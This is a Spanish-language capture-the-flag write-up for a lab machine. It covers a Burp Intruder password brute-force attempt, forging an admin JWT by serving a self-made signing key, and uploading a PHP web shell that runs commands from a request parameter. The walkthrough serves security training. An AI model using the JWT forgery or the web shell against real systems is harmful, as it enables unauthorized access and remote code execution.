## Vulnerability Assessment {-}

### Attaque de typo intruder con BurpSuite {-}

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.230
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password

    ```{r, echo = FALSE, fig.cap="notebook sniper config", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-config.png")
    ```

1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    ```{r, echo = FALSE, fig.cap="notebook sniper payload list", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-list.png")
    ```

1. En Options creamos un regexp para saver cuando la contraseña es valida

    - en Grep - Extract damos a ADD
    - le damos a Fetch response

        ```{r, echo = FALSE, fig.cap="notebook sniper fetch response", out.width="90%"}
        knitr::include_graphics("images/notebook-fetch-response.png")
        ```

1. Le damos a start attack

No encontramos nada.

### Register un nuevo usuario {-}

Como no a sido possible reventar la mamona con un password brute force, utilizamos la web para ver si encontramos una vulnerabilidad.
Nos creamos un usuario y vemos que podemos añadir notas como un blog. Una de las possibilidades seria tratar de hacer fuzzing pero en este 
caso necessitariamos la cookie de session.Analizando un poco vemos que la cookie de session esta almazenada por un JWT.

Antes de tratar de fuzzear, mirramos si se puede tratar de reventar el JWT Token.

Copiamos el token y la auditamos en [jwt.io](https://jwt.io)

Vemos que hay una data que se llama *admin_cap* y que esta setteada a 0. Pero si tratamos de cambiar a 1 nos invalida el token y vemos que es porque
necessitamos un key (private o public) que parece que sea en el `http://localhost:7070/privKey.key` de la maquina victima. Possiblemente podriamos Hijackear
la url donde encuentra esta Key por una creado por nosotros.

### JWT Hijacking {-}

1. Nos creamos un par de claves con **openssl**

    ```bash
    openssl genrsa -out privKey.key 2048
    ```
1. Introducimos la key en la web de JWT.io

    ```{r, echo = FALSE, fig.cap="jwt hijacking", out.width="90%"}
    knitr::include_graphics("images/jwt-hijacking.png")
    ```

1. Nos entablamos un servidor web para que pueda cojer la key

    ```bash
    python3 -m http.server 7070
    ```

1. Copiamos el JWT token en firefox

    ```{r, echo = FALSE, fig.cap="jwt firefox hijack", out.width="90%"}
    knitr::include_graphics("images/jwt-firefox.png")
    ```

Ya lanzando la web otra vez y vemos que un Admin Panel a salido y en el cual se puede ver notas y uploadear ficheros.

### Analizamos las notas {-}

Analizando las notas se puede ver :

- Usuario admin
- Usuario Noah
- Ejecucion de fichero php

### Uploadeamos un s4vishell.php {-}

Como hay un boton upload vamos a por una `s4vishell.php`

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Subimos el fichero y perfecto nos va y pinchando el boton view ya tenemos Remote Code Execution

